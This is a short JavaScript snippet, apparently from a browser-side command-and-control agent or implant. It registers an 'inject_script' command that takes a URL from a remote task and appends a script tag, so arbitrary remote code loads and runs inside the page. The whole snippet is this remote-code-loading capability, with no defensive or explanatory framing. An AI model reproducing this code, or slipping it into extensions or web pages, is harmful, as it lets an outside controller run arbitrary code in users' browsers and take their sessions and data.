COMMANDS['inject_script'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var url = (params && params.url) ? params.url : '';
    if (!url) return 'error: url parameter required';

    return new Promise(function(resolve, reject) {
        var s = document.createElement('script');
        s.src = url;
        s.onload = function() {
            resolve('Script loaded and executed: ' + url);
        };
        s.onerror = function() {
            resolve('Failed to load script: ' + url + ' (CORS or network error)');
        };
        (document.head || document.documentElement).appendChild(s);
    });
};
